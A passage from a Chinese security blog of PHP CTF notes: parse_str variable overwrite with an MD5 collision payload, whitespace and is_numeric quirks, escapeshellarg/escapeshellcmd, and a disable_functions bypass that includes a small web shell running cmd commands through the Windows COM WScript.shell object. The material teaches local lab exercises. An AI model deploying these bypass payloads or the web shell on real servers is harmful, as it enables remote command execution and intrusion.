+<h2 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str"></a>parse_str</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">"flag&#123;hello_world&#125;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	show_source(_FILE_);</span><br><span class="line">	<span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	$a=<span class="string">'yichen666'</span>;</span><br><span class="line">	$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">	@parse_str($id);</span><br><span class="line">	<span class="keyword">if</span>($a[<span class="number">0</span>]!=<span class="string">'QNKCDZO'</span>&amp;&amp;md5($a[<span class="number">0</span>])==md5(<span class="string">'QNKCDZO'</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> $flag;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">'It\'s so easy!!'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>分析</strong></p>
+<p>parse_str 会将传入的值变成变量，也就是说传入?id=a[0]那么就会有一个叫做 a[0]的变量，然后只要这个变量的 md5 跟 QNKCDZO 相等就可以了<br><strong>注意：这个函数使用时，由于 php 变量名中不能带点和空格，他们会被转换成下划线</strong></p>
+<p><strong>利用</strong></p>
+<p><a href="http://127.0.0.1/php/variable/parse_str.php?id=a%5B0%5D=s214587387a" target="_blank" rel="noopener">http://127.0.0.1/php/variable/parse_str.php?id=a[0]=s214587387a</a></p>
+<h1 id="空白符"><a href="#空白符" class="headerlink" title="空白符"></a>空白符</h1><h2 id="intval"><a href="#intval" class="headerlink" title="intval"></a>intval</h2><p>会跳过一些空白符：\t\n\r\v\f 等<br>获取变量的整数值，成功时返回 integer 值，失败时返回 0，空的 array 返回 0，非空的 array 返回 1<br>常规字符串会消失：123aa 会变成 123</p>
+<p>浮点精度</p>
+<p>1.000000000000000000001==1（0 加到一定程度是跟 1 一样大的）</p>
+<h2 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric"></a>is_numeric</h2><p>检查变量是否为数字或数字字符串<br>is_numeric 检测的时候会自动过滤掉前面的 ‘ ‘, ‘\t’, ‘\n’, ‘\r’, ‘\v’, ‘\f’ 等字符，但是不会过滤 ‘\0’，如果这些字符出现在字符串尾，不会过滤，而是返回 false</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//bugku的一道题</span></span><br><span class="line">$num=$_GET[<span class="string">'num'</span>];</span><br><span class="line"> <span class="keyword">if</span>(!is_numeric($num))</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="keyword">echo</span> $num;</span><br><span class="line"> <span class="keyword">if</span>($num==<span class="number">1</span>)</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'flag&#123;**********&#125;'</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="trim"><a href="#trim" class="headerlink" title="trim"></a>trim</h2><p>默认情况下会除掉首尾空白符：\n\t\r\v\0\x0B<br>trim 函数会过滤空格以及 \n\r\t\v\0，但不会过滤过滤\f</p>
+<h1 id="伪随机数"><a href="#伪随机数" class="headerlink" title="伪随机数"></a>伪随机数</h1><p>种子一样的时候生成的随机数是一样的，如果拿到了种子，可以知道接下来生成的随机数</p>
+<h2 id="mt-srand"><a href="#mt-srand" class="headerlink" title="mt_srand"></a>mt_srand</h2><h2 id="mt-rand"><a href="#mt-rand" class="headerlink" title="mt_rand"></a>mt_rand</h2><h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">"flag&#123;hello_world!&#125;"</span>;</span><br><span class="line">$a=<span class="string">"test"</span>;</span><br><span class="line">$b=<span class="string">"test2"</span>;</span><br><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line">$c=is_numeric($a) <span class="keyword">and</span> is_numeric($b);</span><br><span class="line"><span class="keyword">if</span>($c)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(is_numeric($a))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(is_numeric($b))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"is_numeric(b)"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> $flag;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'is_numeric(a) error'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"is_numeric(a) and is_numeric(b) error !"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="http://127.0.0.1/php/learn/yun_suan_fu.php?a=123" target="_blank" rel="noopener">http://127.0.0.1/php/learn/yun_suan_fu.php?a=123</a><br>第七行，先$c=is_numeric($a)，然后再 and，但是$c已经是正确的了，下面的$b 就用定义好的就行了</p>
+<h1 id="parse-url"><a href="#parse-url" class="headerlink" title="parse_url"></a>parse_url</h1><p>解析 url，返回其组成部分，返回值是数组</p>
+<h1 id="escapeshellarg"><a href="#escapeshellarg" class="headerlink" title="escapeshellarg"></a>escapeshellarg</h1><p>把字符串转码为可以在 shell 中使用的参数</p>
+<p>给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数<br>并且还是确保安全的</p>
+<h1 id="escapeshellcmd"><a href="#escapeshellcmd" class="headerlink" title="escapeshellcmd"></a>escapeshellcmd</h1><p>shell 元字符转义，对字符串中存在的可能欺骗 shell 执行的任意命令的字符进行转义</p>
+<p>反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$, \x0A  和  \xFF。 ‘  和  “  仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及  %  和  !  字符都会被空格代替。</p>
+<h1 id="disable-function"><a href="#disable-function" class="headerlink" title="disable_function"></a>disable_function</h1><p>apache  的配置文件 php.ini  文件中定义的不允许执行的函数，在 phpinfo  中也会有表示</p>
+<h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><p>使用不在列表之中的函数<br>如果 system  可以使用  php  本身的命令实现，可以不用 system<br>例如：scandir  用于列目录，就代替了 system(‘ls’);</p>
+<h2 id="扩展使用"><a href="#扩展使用" class="headerlink" title="扩展使用"></a>扩展使用</h2><h3 id="Windows-下-COM-组件（系统组件）"><a href="#Windows-下-COM-组件（系统组件）" class="headerlink" title="Windows  下 COM  组件（系统组件）"></a>Windows  下 COM  组件（系统组件）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$command = $_GET[<span class="string">'a'</span>];</span><br><span class="line">$wsh = <span class="keyword">new</span> COM(<span class="string">'WScript.shell'</span>);<span class="comment">//生成一个COM对象 Shell.Application也行</span></span><br><span class="line">$exec = $wsh-&gt;exec(<span class="string">"cmd /c "</span>.$command);<span class="comment">//调用对象方法来执行命令</span></span><br><span class="line">$stdout = $exec-&gt;stdout();</span><br><span class="line">$stroutput = $stdout-&gt;ReadAll();</span><br><span class="line"><span class="keyword">echo</span> $stroutput;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="pcntl-扩展"><a href="#pcntl-扩展" class="headerlink" title="pcntl  扩展"></a>pcntl  扩展</h3><p>以给定参数执行程序</p>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://yoursite.com/2019/11/10/oxci5k/" data-id="ckco53qbu000y8ou98q6k2wny" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+                                    </footer>
+
+    </div>
+
+    
+        
+  <nav class="article-nav">
+    
+      <a href="/2019/11/10/iai2tr/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer</strong>
+        <div class="article-nav-title">
+          
+            XXE相关
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2019/11/10/svqdx3/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">反序列化相关</div>
+      </a>
+    
+  </nav>
+
+
+            
+
+                
+                    
+    <div class="vcomments" id="vcomments"></div>
+    
+<script src="https://unpkg.com/valine/dist/Valine.min.js"></script>
+
+        <script>
+            new Valine({
+                el: '#vcomments',
+                appId: '',
+                appKey: '',
+                notify: 'false',
+                verify: 'true',
+                avatar: 'mp',
+                pageSize: '10',
+                placeholder: '请输入...'
+            })
+        </script>
+        
+                        
+                            
+
+</article>
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2020 yichen&#39;s blog</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/head.png" alt="yichen&#39;s blog"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">主页</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">归档</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="https://www.yuque.com/hxfqg9" target="_blank" rel="noopener">语雀</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="https://mp.weixin.qq.com/s/_xKmbanQddRoX2SoAcihWA" target="_blank" rel="noopener">关于</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
